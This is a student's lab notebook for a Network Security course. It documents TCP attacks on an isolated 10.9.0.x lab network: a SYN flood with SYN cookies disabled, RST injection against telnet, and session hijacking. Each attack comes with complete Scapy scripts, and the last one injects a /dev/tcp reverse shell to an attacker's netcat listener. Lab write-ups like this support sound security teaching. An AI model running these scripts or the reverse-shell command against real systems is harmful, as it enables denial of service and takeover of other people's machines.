---
tags:
  - "#lesson"
  - lab
week: 3
creation date: 2023-10-01 11:15
modification date: Sunday 1st October 2023 11:15:05
reviewed: 
summary: 
course_name: Network Security
publish: true
---
# Task 1: SYN Flooding Attack
##  Prerequisites
### Minimize the size of the queue
`sysctl net.ipv4.tcp_max_syn_backlog` to check the size of the queue that it can store the half open connection
Try to change it to a smaller number such that we dont have to wait for too long before the queue gets full
you can change the queue size using `sysctl net.ipv4.tcp_max_syn_backlog=80`

### Disable SYN Cookie
On your victim machine `SYNC cookies` have to be disabled for the attack to be successful. To check the SYN Cookie status, `sysctl -a | grep syncookies`

To turn off `SYNC Cookie` run `sysctl -w net.ipv4.tcp_syncookies=0` set to `1` to enable
## Code
```python
from scapy.all import IP, TCP, send
from ipaddress import IPv4Address
from random import getrandbits

ip = IP(dst="10.9.0.5")
tcp = TCP(dport=23,flags="S")
pkt = ip/tcp
while True:
  pkt[IP].src = str(IPv4Address(getrandbits(32)))
  pkt[TCP].sport = getrandbits(16)
  pkt[TCP].seq = getrandbits(32)
  send(pkt,verbose=0)
```

## Result
### Attacker
On the attacker machine run the code to carry out the SYNC flood attack on the victim machine on `10.9.0.5` with port `23`
![[Pasted image 20231001111701.png]]
### Number of items in the queue
We can check the queue size using `netstat -tna | grep SYN_RECV | wc -l`, we have set the queue size to `80` previously and we will get the queue capacity of about 60, which is fully taken up
![[Pasted image 20231001113509.png]]
### Telnet
We will then try to `telnet` into the victim machine, using `telnet <IP> <port>` 
Since the queue is flooded with half open connections, telnet keeps `trying` to reach the host, but it could not get into the queue and hence after a few minute, the telnet request `timed out`
![[Pasted image 20231001111716.png]]

# Task 1.3 Enable SYNC Cookie
Enable SYNC Cookie run `sysctl -w net.ipv4.tcp_syncookies=1` in the victim machine
## Attack
![[Pasted image 20231001111701.png]]
## SYNC received
on the client side, after enabling, the number of sync request received is significantly more than the actual size of the queue, which mean the queue is not blocked
![[Pasted image 20231001113814.png]]
## Telnet
![[Pasted image 20231001113940.png]]
Without significant wait, we are able to connect to the victim host directly

# Task 2: TCP RST Attacks on `telnet` Connection
```python
from scapy.all import *

def RSTattack(pkt):
    if IP in pkt and TCP in pkt:
        ip = IP(src=pkt[IP].src, dst=pkt[IP].dst)
        tcp = TCP(sport=pkt[TCP].sport, dport=pkt[TCP].dport, flags="R", seq=pkt[TCP].seq)
        spoofedPkt = ip/tcp
        ls(spoofedPkt)
        send(spoofedPkt, verbose=0)

sniff(iface='br-c26fa13374f9', filter='tcp', prn=RSTattack)
```
## Result
When the client initiate a telnet connection, the attacker side will sniffed this tcp packet and try to construct a TCP packet with the same sender and receiver information with a reset flag
To carry out the attack
1. Run `python3 rst.py` on the `attacker` machine
2. Run `telnet 10.9.0.5 23` to initiate a telnet connection from the client machine to the victim server
You will see the connection being established and soon being terminated by the server because the attacker send a `RST` packet to the server to terminate the connection
>[!warning]
>This attack is carried out under assumption that all the machines are under the same `LAN`
## Attacker Output
![[Pasted image 20231001120950.png]]
it is spoofing a packet with flag set to `R` which is the RST flag
## Client output
![[Pasted image 20231001121725.png]]
it first connected, but the connection soon being closed

# Task 3: TCP Session hijacking

```python
from scapy.all import *

def sniffAndHijack(pkt):
	old_seq = pkt[TCP].seq
	old_ack = pkt[TCP].ack
	ip = IP(src=pkt[IP].dst, dst=pkt[IP].src)
	tcp = TCP(sport=pkt[TCP].dport, dport=pkt[TCP].sport, flags="A", seq=old_ack+5, ack=old_seq)
	data = "\r echo HIJACK!! >> hello.txt \r"
	spoofedPkt = ip/tcp/data
	send(spoofedPkt,iface="br-c26fa13374f9")
sniff(iface='br-c26fa13374f9', filter='tcp and src host 10.9.0.5 and src port 23', prn=sniffAndHijack)
```
1. spoofed a packet by swapping the `source` and `destination` `IP` and `ports`, with the sequence number as the `ack` number of the previous packet plus a small number, `5` in this case. the `ack` number for the spoofed packet is the old `seq number` of the previous packet
2. send the command that you want to execute, in this case `echo hijack >> hello.txt` which creates a hello.txt file in the server machine with content hijack
3. construct the spoofed packet
4. send it out

## Steps to carry out attack
1. On victim machine telnet into the server machine using `telnet <IP> <port>`, you will be prompted to enter the `username` and `password`
2. On the `attacker` machine, run the hijack code to watch for the tcp packets that is a `reply` from the server back to the client
3. try to run ls on the `telnet` session, after `5` successful telnet requests, the session hanged, because they realised that there are multiple packets of the same `seq` number being sent
4. reopen the telnet session and `ls` again, you will see a `hello.txt` file in the directory, and run `cat hello.txt` will output `hijack`
## Result
### Telnet session hanging
![[Pasted image 20231001160025.png]]
### Running hijack code on the server
![[Pasted image 20231001160049.png]]
### Hijack result
![[Pasted image 20231001160126.png]]

# Task 4: Reverse Shell

Use the same code as task 3  and change the data to send to the command to setup reverse shell
`\r /bin/bash -i > /dev/tcp/10.9.0.1/9090 0<&1 2>&1 \r`

## Code 
```python
from scapy.all import *

def sniffAndHijack(pkt):
	old_seq = pkt[TCP].seq
	old_ack = pkt[TCP].ack
	ip = IP(src=pkt[IP].dst, dst=pkt[IP].src)
	tcp = TCP(sport=pkt[TCP].dport, dport=pkt[TCP].sport, flags="A", seq=old_ack+5, ack=old_seq)
	data = "\r /bin/bash -i > /dev/tcp/10.9.0.1/9090 0<&1 2>&1 \r"
	spoofedPkt = ip/tcp/data
	send(spoofedPkt,iface="br-c26fa13374f9",verbose=0)

sniff(iface='br-c26fa13374f9', filter='tcp and src host 10.9.0.5 and src port 23', prn=sniffAndHijack)
```

## Steps to carry out attack
1. run the `netcat` client on the attacker machine using `netcat -lvn 9090`
2. make sure the client machine is connected to the server machine using `telnet`
3. start the `reverseShell.py` code on the attacker's machine
4. try to run some command on the `telnet` connection until the connection hanged
5. The `netcat` client will then gain access to a interactive shell

## Result and observation
### Running the telnet client on the attacker machine
![[Pasted image 20231001161635.png]]
### Connect the client to the victim server
![[Pasted image 20231001161736.png]]
### Start the reverseShell code
![[Pasted image 20231001161816.png]]
### Telnet session hanging
![[Pasted image 20231001161601.png]]
### Gain control to the interactive shell
![[Pasted image 20231001161834.png]]
There will be a connection received on 10.9.0.5 which is the IP of the victim machine
We now have a interactive shell that we can manipulate to access the content in the victim machine